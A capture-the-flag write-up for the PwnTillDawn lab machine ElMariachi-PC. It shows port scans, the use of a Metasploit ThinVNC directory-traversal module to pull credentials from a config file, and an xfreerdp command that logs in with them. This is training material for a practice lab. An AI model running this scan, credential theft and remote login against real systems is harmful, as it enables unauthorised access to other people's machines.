---
title: "PwnTillDawn - ElMariachi-PC "
author: Nasrallah
description: ""
date: 2022-10-09 00:00:00 +0000
categories : [PwnTillDawn]
tags: [pwntilldawn, windows, vnc, rdp]
img_path: /assets/img/pwntilldawn/elmariachi
---

---


# **Description**

Hello hackers, I hope you are doing well. We are doing [ElMariachi-PC ](https://online.pwntilldawn.com/Target/Show/30) from [PwnTillDawn](https://online.pwntilldawn.com/). We found a vulnerable service running on a high ports, we exploit that to get credentials and connect via rdp. 

# **Enumeration**

## nmap

We start a nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```terminal
Nmap scan report for 10.150.150.69
Host is up (0.097s latency).
Not shown: 996 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: ELMARIACHI-PC
|   NetBIOS_Domain_Name: ELMARIACHI-PC
|   NetBIOS_Computer_Name: ELMARIACHI-PC
|   DNS_Domain_Name: ElMariachi-PC
|   DNS_Computer_Name: ElMariachi-PC
|   Product_Version: 10.0.17763
|_  System_Time: 2022-05-09T11:43:47+00:00
|_ssl-date: 2022-05-09T11:43:55+00:00; +45m04s from scanner time.
| ssl-cert: Subject: commonName=ElMariachi-PC
| Not valid before: 2022-05-08T11:36:51
|_Not valid after:  2022-11-07T11:36:51
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2022-05-09T11:43:50
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
|_clock-skew: mean: 45m04s, deviation: 0s, median: 45m03s
```

We see we have SMB running on it's default ports as well as RDP.

There is nothing really useful to get from those two services so i scanned all port using [Threader3000](https://github.com/dievus/threader3000).

```terminal
------------------------------------------------------------                                                                                        [185/185]
        Threader 3000 - Multi-threaded Port Scanner                           
                       Version 1.0.6                                          
                   A project by The Mayor                                     
------------------------------------------------------------                  
Enter your target IP address or URL here: 10.150.150.69                       
------------------------------------------------------------                  
Scanning target 10.150.150.69                                                 
Time started: 2022-09-21 12:52:31.751635                                                                                                                     
------------------------------------------------------------                  
Port 135 is open                                                              
Port 139 is open                                                                                                                                             
Port 445 is open                                                              
Port 3389 is open                                                             
Port 5040 is open                                                                                                                                            
Port 49665 is open                                                                                                                                           
Port 49667 is open                                                                                                                                           
Port 49664 is open                                                                                                                                           
Port 49670 is open                                                                                                                                           
Port 49666 is open                                                                                                                                           
Port 49668 is open                                                            
Port 49669 is open                     
Port 50417 is open                                                            
Port 60000 is open                                                            
Port scan completed in 0:00:34.550252                                                                                                                        
------------------------------------------------------------ 
```

We found a bunch of other open ports, let's run a service scan on them.

```bash
sudo nmap -p135,139,445,3389,5040,49665,49667,49664,49670,49666,49668,49669,50417,60000 -sV -sC -T4 -Pn
```

```terminal
Nmap scan report for 10.150.150.69                                                                                                                           
Host is up (0.087s latency).                                                                                                                                 
                                                                                                                                                             
PORT      STATE SERVICE       VERSION                                                                                                                        
135/tcp   open  msrpc         Microsoft Windows RPC                                                                                                          
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2022-09-21T17:07:23+00:00; +10m41s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: ELMARIACHI-PC
|   NetBIOS_Domain_Name: ELMARIACHI-PC
|   NetBIOS_Computer_Name: ELMARIACHI-PC
|   DNS_Domain_Name: ElMariachi-PC
|   DNS_Computer_Name: ElMariachi-PC
|   Product_Version: 10.0.17763
|_  System_Time: 2022-09-21T17:06:53+00:00
| ssl-cert: Subject: commonName=ElMariachi-PC
| Not valid before: 2022-09-20T15:25:19 
|_Not valid after:  2023-03-22T15:25:19 
5040/tcp  open  unknown
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
50417/tcp open  msrpc         Microsoft Windows RPC
60000/tcp open  unknown
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 404 Not Found
|     Content-Type: text/html
|     Content-Length: 177
|     Connection: Keep-Alive
|     <HTML><HEAD><TITLE>404 Not Found</TITLE></HEAD><BODY><H1>404 Not Found</H1>The requested URL nice%20ports%2C/Tri%6Eity.txt%2ebak was not found on this 
server.<P></BODY></HTML>
|   GetRequest: 
|     HTTP/1.1 401 Access Denied
|     Content-Type: text/html
|     Content-Length: 144
|     Connection: Keep-Alive
|     WWW-Authenticate: Digest realm="ThinVNC", qop="auth", nonce="o6e0bi3j5UDo3EcCLePlQA==", opaque="dQwMTtxk2a2YM2Qf4DoI35O5R0L08eFaCP"
|_    <HTML><HEAD><TITLE>401 Access Denied</TITLE></HEAD><BODY><H1>401 Access Denied</H1>The requested URL requires authorization.<P></BODY></HTML>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cg
i?new-service :
SF-Port60000-TCP:V=7.92%I=7%D=9/21%Time=632B419F%P=x86_64-pc-linux-gnu%r(G
SF:etRequest,179,"HTTP/1\.1\x20401\x20Access\x20Denied\r\nContent-Type:\x2
SF:0text/html\r\nContent-Length:\x20144\r\nConnection:\x20Keep-Alive\r\nWW
SF:W-Authenticate:\x20Digest\x20realm=\"ThinVNC\",\x20qop=\"auth\",\x20non
SF:ce=\"o6e0bi3j5UDo3EcCLePlQA==\",\x20opaque=\"dQwMTtxk2a2YM2Qf4DoI35O5R0
SF:L08eFaCP\"\r\n\r\n<HTML><HEAD><TITLE>401\x20Access\x20Denied</TITLE></H
SF:EAD><BODY><H1>401\x20Access\x20Denied</H1>The\x20requested\x20URL\x20\x
SF:20requires\x20authorization\.<P></BODY></HTML>\r\n")%r(FourOhFourReques
SF:t,111,"HTTP/1\.1\x20404\x20Not\x20Found\r\nContent-Type:\x20text/html\r
SF:\nContent-Length:\x20177\r\nConnection:\x20Keep-Alive\r\n\r\n<HTML><HEA
SF:D><TITLE>404\x20Not\x20Found</TITLE></HEAD><BODY><H1>404\x20Not\x20Foun
SF:d</H1>The\x20requested\x20URL\x20nice%20ports%2C/Tri%6Eity\.txt%2ebak\x
SF:20was\x20not\x20found\x20on\x20this\x20server\.<P></BODY></HTML>\r\n");
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 10m40s, deviation: 0s, median: 10m40s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2022-09-21T17:06:54
|_  start_date: N/A
```

On port 60000, the scan revealed an interesting header.

```
WWW-Authenticate: Digest realm="ThinVNC"
```

Seems that the port is running `ThinVNC`.

# **Foothold**

I searched on metasploit for `ThinVNC` and found this module `auxiliary(scanner/http/thinvnc_traversal`

Running the module we succeed in getting some credentials.

```terminal
msf6 auxiliary(scanner/http/thinvnc_traversal) > set rhosts 10.150.150.69
rhosts => 10.150.150.69
msf6 auxiliary(scanner/http/thinvnc_traversal) > set rport 60000
rport => 60000
msf6 auxiliary(scanner/http/thinvnc_traversal) > exploit

[+] File ThinVnc.ini saved in: /home/sirius/.msf4/loot/20220921130005_default_10.150.150.69_thinvnc.traversa_032648.txt
[+] Found credentials: desperado:TooComplicatedToGuessMeAhahah<**SNIP**>
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/http/thinvnc_traversal) > 
```

We can connect to RDP using the following command.

```bash
xfreerdp /u:desperado /p:TooComplicatedToGuessMeAhahah<**SNIP**> /v:10.150.150.69 /cert:ignore /dynamic-resolution +clipboard /drive:./,share
```


---

Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).

---

# References
